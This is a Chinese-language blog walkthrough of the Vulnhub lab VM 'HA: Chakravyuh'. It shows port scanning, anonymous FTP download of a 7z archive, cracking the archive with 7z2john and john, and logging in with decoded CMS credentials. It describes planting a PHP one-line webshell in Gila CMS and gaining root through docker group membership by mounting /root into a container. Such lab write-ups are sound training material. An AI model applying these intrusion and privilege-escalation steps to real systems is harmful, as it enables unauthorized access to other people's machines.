---
layout: post
title: "chakravyuh walkthrough"
date: 2021-10-01
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP                |
| ------------- | ----------------- |
| 本机（Win10） | `192.168.174.1`   |
| Kali          | `192.168.174.128` |
| Chakravyuh    | `192.168.174.130` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.174.130`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.174.130                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-01 09:46 EDT
Nmap scan report for 192.168.174.130
Host is up (0.00030s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c6:54:93:e8:1c:aa:f7:5f:d0:7d:6e:2e:df:ec:88:69 (RSA)
|   256 d4:b4:2e:96:4e:f7:f6:b7:83:a8:ef:06:6c:80:1d:25 (ECDSA)
|_  256 66:d0:5b:93:56:c5:7a:2e:60:90:c4:4e:4f:18:5a:bd (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Chakravyuh
65530/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Oct 27  2019 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.174.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
MAC Address: 00:0C:29:56:8D:DA (VMware)
```

浏览器浏览主页，没什么特殊的地方，那么下一步使用 *dirb* 工具进行目录枚举看看，发现存在 *phpmyadmin* 路径。

![1]({{ '/chakravyuh/1.png' | prepend: site.url }})

之后信息收集发现 *phpmyadmin* 版本是 **4.6.6**，不过该版本不存在可利用的漏洞，此外进行过弱口令爆破也无果，因此web方面的渗透目前是走不通了。

之前的*nmap*扫描结果中发现服务器的**65530**端口开启了ftp服务，同时支持匿名登陆，并且已经看到了*pub*目录，那么接下来我们进去该目录下看看有什么东西。

```shell
┌──(root💀kali)-[~]
└─# ftp 192.168.174.130 65530
Connected to 192.168.174.130.
220 (vsFTPd 3.0.3)
Name (192.168.174.130:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Oct 27  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           247 Oct 27  2019 arjun.7z
226 Directory send OK.
ftp> get arjun.7z /root/arjun.7z
local: /root/arjun.7z remote: arjun.7z
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for arjun.7z (247 bytes).
226 Transfer complete.
247 bytes received in 0.00 secs (4.5300 MB/s)
ftp> quit
221 Goodbye.
```

该目录下是一个7z压缩包文件：*arjun.7z*，通过Kali 自带的 *7za* 工具进行解压时发现需要输入密码。之后尝试过 *rarcrack*进行爆破，但效果不尽人意。

### 压缩包密码爆破

使用 [7z2join.py](https://github.com/truongkma/ctf-tools/blob/master/John/run/7z2john.py) 脚本获取压缩包hash，使用 *john* 对hash爆破，得到压缩包密码：*family*。

```shell
┌──(root💀kali)-[~/gg]
└─# python2 7z2john.py arjun.7z > hash 
┌──(root💀kali)-[~/gg]
└─# cat hash    
arjun.7z:$7z$0$19$0$1122$8$6d5c2c86b140c3740000000000000000$1433678760$128$114$c96fd8f58ab9f87f9e21599caa51e9e23cac8b20833942d7d8af8564e82e0520cec2c1e5d40fe5156ce7189926bc39cc7675a77d21610e9e39b04abf781d908112eb0fe6e1d3f25df12bbcad6eaac7c11951e5e8e1fe4154a59b996f07e7ce5257c97756b85c2cbaa1ea9d1823ce3cc9dac5d286d92e6fd1f640f6742d517c4d
┌──(root💀kali)-[~/gg]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip [SHA256 128/128 AVX 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 14 for all loaded hashes
Cost 3 (compression type) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
family           (arjun.7z)
1g 0:00:00:00 DONE (2021-10-01 10:56) 1.020g/s 81.63p/s 81.63c/s 81.63C/s samantha..family
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

之后使用 *7za* 工具解压压缩包，命令是：`7za x arjun.7z `。解密出来的 *secret.txt* 内容是：`Z2lsYTphZG1pbkBnbWFpbC5jb206cHJpbmNlc2E=`，看到这个字符串的第一反应就是 base64加密，事实也是base64加密，对其解密我们得到的明文是：`gila:admin@gmail.com:princesa`。看起来像是用户名和密码，不过经过尝试后发现是 */gila* 路径下登录页面中的账户名和密码。

![2]({{ '/chakravyuh/2.png' | prepend: site.url }})

使用 `admin@gmail.com:princesa`用户名和密码进行登录，在后台中我们看到gila cms的版本号是：**1.10.9**，并且该版本存在[LFI漏洞](https://www.exploit-db.com/exploits/47407)，此外也可以编辑php文件。

### Getshell

将一句话木马插入任意php文件，用蚁剑连接即可getshell。

### 提权

在进行一系列的主机信息收集后未找到可提权的程序，不过在查看当前用户组时发现该用户也属docker组。此外也知道运行docker基本都是需要root权限，因此这里我们可以新建一个容器，将本机的*/root*目录挂载在容器里，这样就可以在容器里看到*/root*目录下的内容了，最后就可以得到flag。

```shell
www-data@ubuntu:/tmp$ docker images
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              965ea09ff2eb        23 months ago       5.55MB
www-data@ubuntu:/tmp$ docker run -v /root:/mnt -it 965
docker run -v /root:/mnt -it 965
the input device is not a TTY
www-data@ubuntu:/tmp$ docker run -v /root:/mnt -i 965
docker run -v /root:/mnt -i 965
ls
bin
dev
etc
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cd /mnt
ls
final.txt
cat final.txt

                                   ,╓,
                                   ╢▀╢
                                   ╟Ü╡
                                   ▓Ü╢
              ,╓,              ,,╓▄▓▓╣▄╓,,              ,╓,
              ║▓╙╣        ╓g▓▓╣╣╣╣╣╣▓╣╣╣╣╣╣▓▓æw        ╣╩║▓
                "▓╣ß╗,,g▓╣╣╣╣▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╣╣╣╣▓W,,╥▓▓╢"
                  ▓▌▓▐╣╣╣▓▓▓╩▀'    ▓Ü▒     ╙╩▓▓▓╣╣╣▌▓]Ñ
                  ╒▓╣╣▓▓▓▀        /▓W║m        ╙▓▓▓╣╣▓╗
                 φ╣╣╣▓▓╩▓║@╖,     ╘▓µ╣╛     ,╓@▓║╜▓▓▓╣╣▓
                ▓╣╣▓▓▓   ▓U▓╓@     ▓Ü▒     Æ▓▓H╢`  ╚▓▓╣╣▓
               ▓╣╣▓▓▀     ╙▓▓╣╣,   ╠Ü║   ,▓▓╢Ñ╜     ╙▓▓╣╣▓
              ╒╣╣╣▓▓         ╙▓╬▓▓▓║╢╢▓▓▓▓║"         ╟▓╣╣╣▌
              ▓╣╣▓▓           Æ▓║╣▒▄▓▓▄╢╢▓▓           ▓▓╣╣▓
     ╔▓║╣]¢║╢╟▓▓╣▌╣]║╢╜φ╙╢║║¢U╣▒▒█▓▓▌██▌║Ü╣H¢╬▓▓▓φ▓▓▓¢╢▐╣▓▓▓▓▓@[╣║▓W
      "╙╙ '╙▀╝▓╣╣▓╣'╙╙▀Ü▓▀╙└" ▓▓▒╫███▓█▌╢╫╣'`""╙╩∩╝╙"`▓▓╣╣▓╙╜"` ╙╙"
              ╟╣╣╣▓L          ]▓▓║Ñ▒▒╣@╢▓▓L          ,▓▓╣╣▓
               ╣╣╣▓▓        ╓@╣▓"▀▓▓▓▓▓▀"║╣▓╦,       ▓▓╣╣╣"
               ╙╣╣╣▓▓    ╔╟║╠▓╜    ╟Ü▓    ╙╣╢▓▓φ    ▓▓╣╣╣▌
                ╙╣╣╣▓▓╖ g╢▓▓@"     ╢Ü╣      V╢║▓▓ ╓▓▓╣╣╣▀
                 "▓╣╣▓▓▓@▀        ╙╠▓▓$        ╙▒▓▓▓╣╣▓┘
                   ║▓▓╣▓▓▓&╖       ╣Ü╣`      ,φ▓▓▓╣▓▓▓r
                 ,╣╠▓Ç▓╣╣╣▓▓▓▓&æ╖,,║Ü▓,,╓g&▓▓▓▓╣╣╣▓Ü╢║▓ç
              ,@N╠╝"    ╙▓▓╣╣╣╣▓▓▓▓▓▓▓▓▓▓▓╣╣╣╣╣▓▀    `╨╣╝@,
              ▓▓║╜          "▀▀▓▓╣╣▓▓▓╣╣▓▓▀▀╙          ╙╣▓▓
    

!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Kavish Tyagi : https://twitter.com/Tyagi_kavish_


+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
____________________________________

```



### 总结

1. docker的执行需要root权限，可通过挂载目录的形式来读取高权限的内容，前提是当前用户属docker组
2. 在对7z压缩包进行密码爆破时，使用 7z2john.py 脚本先获取文件hash再爆破
